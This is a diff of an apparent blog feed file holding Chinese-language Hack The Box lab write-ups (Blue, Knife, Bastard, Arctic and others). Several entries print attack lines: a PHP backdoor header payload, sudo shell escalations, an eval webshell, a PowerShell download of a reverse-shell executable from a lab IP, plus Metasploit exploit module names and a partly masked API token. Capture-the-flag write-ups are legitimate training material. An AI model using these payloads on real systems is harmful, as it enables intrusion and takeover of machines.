+<img src="/posts/4797133e/image-20250216155106484.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3477,8 +3603,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Blue</title>
-    <url>/Hackthebox/htb/htb-blue/</url>
-    <content><![CDATA[<style>.fuevnhibsxou{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="fuevnhibsxou">
+    <url>/posts/2c4131d1.html</url>
+    <content><![CDATA[<style>.gwmcshrdguow{zoom:50%;}</style><img src="/posts/2c4131d1/52e077ae40899ab8b024afd51cb29b1c.png" class="gwmcshrdguow">
 
 <span id="more"></span>
 
@@ -3494,10 +3620,12 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250216114713990.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/2c4131d1/image-20250216114713990.png" class="" title="Nmap">
+
 <p>一个开放了445端口的Win7，直接尝试使用ms17-010 攻击目标</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块进行攻击</p>
-<p><img src="/image-20250216120342061.png" alt="永恒之蓝"></p>
+<img src="/posts/2c4131d1/image-20250216120342061.png" class="" title="永恒之蓝">
+
 <table>
 <thead>
 <tr>
@@ -3525,8 +3653,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Knife</title>
-    <url>/Hackthebox/htb/htb-knife/</url>
-    <content><![CDATA[<style>.lpofxqvyqrtx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="lpofxqvyqrtx">
+    <url>/posts/872a7a04.html</url>
+    <content><![CDATA[<style>.kpdhxcmkusqc{zoom:50%;}</style><img src="/posts/872a7a04/110fe6608793064cf171080150ebd0dc.png" class="kpdhxcmkusqc">
 
 <span id="more"></span>
 
@@ -3542,21 +3670,29 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250216104801646.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/872a7a04/image-20250216104801646.png" class="" title="Nmap">
+
 <p>开放了22(SSH)和80(HTTP)</p>
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb获取web指纹 PHP 8.1.0-dev ，Google一下，存在一个后门</p>
-<p><img src="/image-20250216104951989.png" alt="whatweb"></p>
-<p><img src="/image-20250216110740874.png" alt="image-20250216110740874"></p>
+<img src="/posts/872a7a04/image-20250216104951989.png" class="" title="whatweb">
+
+<img src="/posts/872a7a04/image-20250216110740874.png" class="" title="image-20250216110740874">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>抓包，使用payload <code>User-Agentt: zerodiumsystem(&quot;id&quot;);</code></p>
-<p><img src="/image-20250216110553497.png" alt="后门"></p>
+<img src="/posts/872a7a04/image-20250216110553497.png" class="" title="后门">
+
 <p>直接反弹shell</p>
-<p><img src="/image-20250216111124234.png" alt="反弹shell"></p>
+<img src="/posts/872a7a04/image-20250216111124234.png" class="" title="反弹shell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 查看有哪些可以利用的点，找到一个knife</p>
-<p><img src="/image-20250216111432749.png" alt="提权"></p>
+<img src="/posts/872a7a04/image-20250216111432749.png" class="" title="提权">
+
 <p>运行一下knife，发现可以执行命令</p>
-<p><img src="/image-20250216112140995.png" alt="knife"></p>
+<img src="/posts/872a7a04/image-20250216112140995.png" class="" title="knife">
+
 <p>使用<code>sudo knife exec --exec &quot;exec &#39;/bin/sh -i &#39;&quot;</code> 成功提权</p>
-<p><img src="/image-20250216112920949.png" alt="GetShell"></p>
+<img src="/posts/872a7a04/image-20250216112920949.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3584,8 +3720,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Shocker</title>
-    <url>/Hackthebox/htb/htb-shocker/</url>
-    <content><![CDATA[<style>.mqkhjmauwxsm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="mqkhjmauwxsm">
+    <url>/posts/38c5e2d.html</url>
+    <content><![CDATA[<style>.afiifbntqiqt{zoom:50%;}</style><img src="/posts/38c5e2d/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="afiifbntqiqt">
 
 <span id="more"></span>
 
@@ -3601,16 +3737,23 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250216093127462.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/38c5e2d/image-20250216093127462.png" class="" title="Nmap">
+
 <p>开放了80(HTTP) 和2222(SSH)</p>
 <h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>使用dirb进行目录猜解，发现 <code>/cgi-bin/</code>目录</p>
-<p><img src="/image-20250216095828722.png" alt="dirb"></p>
+<img src="/posts/38c5e2d/image-20250216095828722.png" class="" title="dirb">
+
 <p>然后使用Fuff 继续猜解，找到一个 <code>user.sh</code></p>
-<p><img src="/image-20250216095724470.png" alt="Fuff"></p>
+<img src="/posts/38c5e2d/image-20250216095724470.png" class="" title="Fuff">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> 模块</p>
-<p><img src="/image-20250216101417329.png" alt="GetShell"></p>
+<img src="/posts/38c5e2d/image-20250216101417329.png" class="" title="GetShell">
+
+
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 发现可以利用perl 进行提权 <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
-<p><img src="/image-20250216103049798.png" alt="GetShell"></p>
+<img src="/posts/38c5e2d/image-20250216103049798.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3637,8 +3780,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Tenten</title>
-    <url>/Hackthebox/htb/htb-tenten/</url>
-    <content><![CDATA[<style>.zeuvqdqqrwlh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="zeuvqdqqrwlh">
+    <url>/posts/78c78349.html</url>
+    <content><![CDATA[<style>.aelezjkqrjlz{zoom:50%;}</style><img src="/posts/78c78349/e58a465e93364c423cd2162945f8f7bf.png" class="aelezjkqrjlz">
 
 <span id="more"></span>
 
@@ -3654,31 +3797,42 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Medium</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p><img src="/image-20250215132349182.png" alt="Nmap"></p>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><img src="/posts/78c78349/image-20250215132349182.png" class="" title="Nmap">
+
 <p>开放了80端口，添加域名解析到hosts文件</p>
 <pre class="language-none"><code class="language-none">$ echo &#39;10.10.10.10 tenten.htb&#39; | sudo tee -a &#x2F;etc&#x2F;hosts</code></pre>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb识别站点指纹，目标为WordPress</p>
-<p><img src="/image-20250215132915851.png" alt="whatweb"></p>
+<img src="/posts/78c78349/image-20250215132915851.png" class="" title="whatweb">
+
 <p>点开文章，获得一个用户名(takis)，备用</p>
-<p><img src="/image-20250215151109164.png" alt="信息收集"></p>
+<img src="/posts/78c78349/image-20250215151109164.png" class="" title="信息收集">
+
 <h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>根据获取到的指纹，使用wpscan进行扫描，新版wpscan 要想获得漏洞信息，需要在官网注册账号，然后指定apk-token</p>
 <pre class="language-none"><code class="language-none">wpscan  --url tenten.htb  --api-token WRH0ACCYJIBtqTKdxxxxxxxxxxLy1ZWzsAcxa8fA3s4</code></pre>
 
-<p><img src="/image-20250215144154195.png" alt="漏洞扫描"></p>
+<img src="/posts/78c78349/image-20250215144154195.png" class="" title="漏洞扫描">
+
 <p>通过Fuzz 可以找到一个<code>/index.php/jobs/apply/13/</code>页面获取到标题</p>
-<p><img src="/image-20250215143621824.png" alt="信息收集"></p>
+<img src="/posts/78c78349/image-20250215143621824.png" class="" title="信息收集">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在github可以找到一个CVE-2015-6668的Python2脚本，需要将脚本语法改成Python3</p>
-<p><img src="/image-20250215144333970.png" alt="漏洞利用"></p>
+<img src="/posts/78c78349/image-20250215144333970.png" class="" title="漏洞利用">
+
 <p>这张图片被隐写了信息，可以使用<code>steghide</code> 进行提取</p>
-<p><img src="/image-20250215145349051.png" alt="提取信息"></p>
+<img src="/posts/78c78349/image-20250215145349051.png" class="" title="提取信息">
+
 <p>使用<code>john</code>进行密码破解</p>
-<p><img src="/image-20250215151629727.png" alt="破解密码"></p>
+<img src="/posts/78c78349/image-20250215151629727.png" class="" title="破解密码">
+
 <p>修改 <code>id_rsa</code> 权限，然后使用最开始收集到的用户名和破解出来的密码进行ssh 登录</p>
-<p><img src="/image-20250215151534084.png" alt="Getshell"></p>
+<img src="/posts/78c78349/image-20250215151534084.png" class="" title="Getshell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 发现一个脚本，直接运行脚本即可提权</p>
-<p><img src="/image-20250215152404422.png" alt="信息收集"></p>
-<p><img src="/image-20250215152228863.png" alt="Getshell"></p>
+<img src="/posts/78c78349/image-20250215152404422.png" class="" title="信息收集">
+
+<img src="/posts/78c78349/image-20250215152228863.png" class="" title="Getshell">
+
 <table>
 <thead>
 <tr>
@@ -3706,8 +3860,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Bastard</title>
-    <url>/Hackthebox/htb/htb-bastard/</url>
-    <content><![CDATA[<style>.ytghsiftheqe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="ytghsiftheqe">
+    <url>/posts/7134392b.html</url>
+    <content><![CDATA[<style>.pbdgkfluyiet{zoom:50%;}</style><img src="/posts/7134392b/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="pbdgkfluyiet">
 
 <span id="more"></span>
 
@@ -3723,27 +3877,38 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Medium</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250215103413869.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/7134392b/image-20250215103413869.png" class="" title="Nmap">
+
 <p>开放80、135和49154端口，并且80端口发现一些目录和文件，添加域名解析到hosts文件</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.9 bastard.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问 <code>/CHANGELOG.txt</code> 发现 CMS 为 <code>Drupal 7.54</code> </p>
-<p><img src="/image-20250215105400323.png" alt="信息收集"></p>
+<img src="/posts/7134392b/image-20250215105400323.png" class="" title="信息收集">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索可用exp</p>
-<p><img src="/image-20250215112934416.png" alt="searchsploit"></p>
+<img src="/posts/7134392b/image-20250215112934416.png" class="" title="searchsploit">
+
 <p> 修改脚本，并使用payload <code>&#39;data&#39; =&gt; &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code> ，运行脚本</p>
-<p><img src="/image-20250215125354575.png" alt="修改脚本"></p>
-<p><img src="/image-20250215114456579.png" alt="exp"></p>
+<img src="/posts/7134392b/image-20250215125354575.png" class="" title="修改脚本">
+
+<img src="/posts/7134392b/image-20250215114456579.png" class="" title="exp">
+
 <p>配置蚁剑，连接webshell</p>
-<p><img src="/image-20250215125510849.png" alt="连接webshell"></p>
+<img src="/posts/7134392b/image-20250215125510849.png" class="" title="连接webshell">
+
 <p>将webshell转换为msfconsole，先生成exe 然后使用蚁剑上传并执行exe</p>
-<p><img src="/image-20250215122000088.png" alt="生成payload"></p>
-<p><img src="/image-20250215125046135.png" alt="上传exe并执行"></p>
-<p><img src="/image-20250215122253560.png" alt="GetShell"></p>
+<img src="/posts/7134392b/image-20250215122000088.png" class="" title="生成payload">
+
+<img src="/posts/7134392b/image-20250215125046135.png" class="" title="上传exe并执行">
+
+<img src="/posts/7134392b/image-20250215122253560.png" class="" title="GetShell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 脚本进行信息收集</p>
-<p><img src="/image-20250215122221334.png" alt="收集提权信息"></p>
+<img src="/posts/7134392b/image-20250215122221334.png" class="" title="收集提权信息">
+
 <p>使用 <code>exploit/windows/local/ms15_051_client_copy_image</code> 进行权限提升</p>
-<p><img src="/image-20250215122939518.png" alt="GetShell"></p>
+<img src="/posts/7134392b/image-20250215122939518.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3770,8 +3935,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Granny</title>
-    <url>/Hackthebox/htb/htb-granny/</url>
-    <content><![CDATA[<style>.dehwcoppfwwg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="dehwcoppfwwg">
+    <url>/posts/6b0d212.html</url>
+    <content><![CDATA[<style>.fvjlhffrvhyu{zoom:50%;}</style><img src="/posts/6b0d212/e8a122e2d713a4fb4a180bb9ccd20248.png" class="fvjlhffrvhyu">
 
 <span id="more"></span>
 
@@ -3787,16 +3952,21 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250212204730377.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/6b0d212/image-20250212204730377.png" class="" title="Nmap">
+
 <p>开放80(IIS 6.0) 端口并且开启了webdav</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msf <code>windows/iis/iis_webdav_upload_asp</code> 模块进行漏洞利用</p>
-<p><img src="/image-20250212210017947.png" alt="GetShell"></p>
+<img src="/posts/6b0d212/image-20250212210017947.png" class="" title="GetShell">
+
 <p>迁移进程</p>
-<p><img src="/image-20250212210739530.png" alt="进程"></p>
+<img src="/posts/6b0d212/image-20250212210739530.png" class="" title="进程">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 模块进行信息收集</p>
-<p><img src="/image-20250212205939579.png" alt="信息收集"></p>
+<img src="/posts/6b0d212/image-20250212205939579.png" class="" title="信息收集">
+
 <p>使用ms15-051 进行提权</p>
-<p><img src="/image-20250212210630257.png" alt="GetShell"></p>
+<img src="/posts/6b0d212/image-20250212210630257.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3824,8 +3994,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Grandpa</title>
-    <url>/Hackthebox/htb/htb-grandpa/</url>
-    <content><![CDATA[<style>.rqtykikhjmxi{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="rqtykikhjmxi">
+    <url>/posts/c75d4146.html</url>
+    <content><![CDATA[<style>.uiuvtgxczhtd{zoom:50%;}</style><img src="/posts/c75d4146/381683fd107da11f1dc916401ae8aee0.png" class="uiuvtgxczhtd">
 
 <span id="more"></span>
 
@@ -3841,17 +4011,23 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250212200523195.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/c75d4146/image-20250212200523195.png" class="" title="Nmap">
+
 <p>发现80(IIS 6.0) 端口</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> 模块进行漏洞利用</p>
-<p><img src="/image-20250212201611096.png" alt="GetShell"></p>
+<img src="/posts/c75d4146/image-20250212201611096.png" class="" title="GetShell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>local_exploit_suggester</code> 模块进行本地提权的信息收集  </p>
-<p><img src="/image-20250212202135579.png" alt="信息收集"></p>
+<img src="/posts/c75d4146/image-20250212202135579.png" class="" title="信息收集">
+
 <p>使用  <code>windows/local/ms14_070_tcpip_ioctl</code> 进行权限提升，提权失败</p>
-<p><img src="/image-20250212202811599.png" alt="提权"></p>
+<img src="/posts/c75d4146/image-20250212202811599.png" class="" title="提权">
+
 <p>列出进程，迁移进程 <code>migrate 3100</code>，然后重新提权</p>
-<p><img src="/image-20250212202917826.png" alt="进程"></p>
-<p><img src="/image-20250212203009824.png" alt="GetShell"></p>
+<img src="/posts/c75d4146/image-20250212202917826.png" class="" title="进程">
+
+<img src="/posts/c75d4146/image-20250212203009824.png" class="" title="GetShell">
+
 <table>
 <thead>
 <tr>
@@ -3878,8 +4054,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Arctic</title>
-    <url>/Hackthebox/htb/htb-arctic/</url>
-    <content><![CDATA[<style>.cyltyeupvkwg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="cyltyeupvkwg">
+    <url>/posts/d972b09f.html</url>
+    <content><![CDATA[<style>.emvlskqgwcgq{zoom:50%;}</style><img src="/posts/d972b09f/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="emvlskqgwcgq">
 
 <span id="more"></span>
 
@@ -3895,26 +4071,36 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250202222155508.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/d972b09f/image-20250202222155508.png" class="" title="Nmap">
+
 <p>访问10.10.10.11:8500，发现一个目录列表，找到一个后台页面 <code>/CFIDE/administrator</code> 可以看到版本是8</p>
-<p><img src="/image-20250203110808681.png" alt="目录列表"></p>
+<img src="/posts/d972b09f/image-20250203110808681.png" class="" title="目录列表">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit检索coldfusion 8 找到一个RCE，复制exp到当前目录</p>
-<p><img src="/image-20250203111301420.png" alt="searchsploit"></p>
-<p><img src="/image-20250203111746331.png" alt="复制文件到当前目录"></p>
+<img src="/posts/d972b09f/image-20250203111301420.png" class="" title="searchsploit">
+
+<img src="/posts/d972b09f/image-20250203111746331.png" class="" title="复制文件到当前目录">
+
 <p>修改exp里面的IP地址，然后执行脚本，成功获取到shell</p>
-<p><img src="/image-20250203111813277.png" alt="GetShell"></p>
+<img src="/posts/d972b09f/image-20250203111813277.png" class="" title="GetShell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看一下系统信息，Windows Server 2008 R2 x64 </p>
-<p><img src="/image-20250203112144909.png" alt="信息收集"></p>
+<img src="/posts/d972b09f/image-20250203112144909.png" class="" title="信息收集">
+
 <p>使用msf生成一个后门，利用获取到的shell 下载并执行</p>
 <p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
 <p>msfconsole获取shell成功</p>
-<p><img src="/image-20250203114209620.png" alt="GetShell"></p>
+<img src="/posts/d972b09f/image-20250203114209620.png" class="" title="GetShell">
+
 <p>使用msf的ms10-092 脚本进行提权，提示报错需要x64 的meterpreter</p>
-<p><img src="/image-20250203132850659.png" alt="报错"></p>
+<img src="/posts/d972b09f/image-20250203132850659.png" class="" title="报错">
+
 <p>查找x64 的进程进行迁移</p>
-<p><img src="/image-20250203132941496.png" alt="查看进程"></p>
+<img src="/posts/d972b09f/image-20250203132941496.png" class="" title="查看进程">
+
 <p>迁移成功，重新执行提权脚本，成功提权</p>
-<p><img src="/image-20250203133216230.png" alt="迁移进程"></p>
+<img src="/posts/d972b09f/image-20250203133216230.png" class="" title="迁移进程">
+
 <table>
 <thead>
 <tr>
@@ -3941,8 +4127,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Legacy</title>
-    <url>/Hackthebox/htb/htb-legacy/</url>
-    <content><![CDATA[<style>.cyscwevfgpwj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="cyscwevfgpwj">
+    <url>/posts/252e0fef.html</url>
+    <content><![CDATA[<style>.dicrsgkxkgsk{zoom:50%;}</style><img src="/posts/252e0fef/60dc190c4c015cfe3a3aef9b5afca254.png" class="dicrsgkxkgsk">
 
 <span id="more"></span>
 
@@ -3958,9 +4144,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td align="left">Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250201192659015.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/252e0fef/image-20250201192659015.png" class="" title="Nmap">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一个开了445端口的Windows XP，可以试试ms08067</p>
-<p><img src="/image-20250201193355321.png" alt="msfconsole"></p>
+<img src="/posts/252e0fef/image-20250201193355321.png" class="" title="msfconsole">
+
 <table>
 <thead>
 <tr>
@@ -3987,8 +4175,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Devel</title>
-    <url>/Hackthebox/htb/htb-devel/</url>
-    <content><![CDATA[<style>.fohfeonqbnkl{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="fohfeonqbnkl">
+    <url>/posts/97f065fe.html</url>
+    <content><![CDATA[<style>.ukjkupfkbbww{zoom:50%;}</style><img src="/posts/97f065fe/0fb6455a29eb4f2682f04a780ce26cb1.png" class="ukjkupfkbbww">
 
 <span id="more"></span>
 
@@ -4004,18 +4192,24 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><p><img src="/image-20250201213314487.png" alt="Nmap"></p>
+<h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/posts/97f065fe/image-20250201213314487.png" class="" title="Nmap">
+
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.trxlvxjpdhtl{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="trxlvxjpdhtl" alt="登录FTP">
+<style>.yhtcytayeeph{zoom:150%;}</style><img src="/posts/97f065fe/image-20250201213757511.png" class="yhtcytayeeph" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
-<p><img src="/image-20250201215256322.png" alt="生成webshell"></p>
-<p><img src="/image-20250201215437794.png" alt="上传FTP成功"></p>
+<img src="/posts/97f065fe/image-20250201215256322.png" class="" title="生成webshell">
+
+<img src="/posts/97f065fe/image-20250201215437794.png" class="" title="上传FTP成功">
+
 <p>访问webshell，成功接收到shell</p>
-<p><img src="/image-20250201215830245.png" alt="GetShell"></p>
+<img src="/posts/97f065fe/image-20250201215830245.png" class="" title="GetShell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看系统信息，是个win7，使用ms10-015，提权成功</p>
-<p><img src="/image-20250201220950888.png" alt="sysinfo"></p>
-<p><img src="/image-20250201220847566.png" alt="提权成功"></p>
+<img src="/posts/97f065fe/image-20250201220950888.png" class="" title="sysinfo">
+
+<img src="/posts/97f065fe/image-20250201220847566.png" class="" title="提权成功">
+
 <table>
 <thead>
 <tr>
@@ -4042,8 +4236,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Lame</title>
-    <url>/Hackthebox/htb/htb-lame/</url>
-    <content><![CDATA[<style>.rflnwlxasuye{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="rflnwlxasuye">
+    <url>/posts/465d4de8.html</url>
+    <content><![CDATA[<style>.yzzrkenhjigl{zoom:50%;}</style><img src="/posts/465d4de8/fb2d9f98400e3c802a0d7145e125c4ff.png" class="yzzrkenhjigl">
 
 <span id="more"></span>
 
@@ -4059,14 +4253,16 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
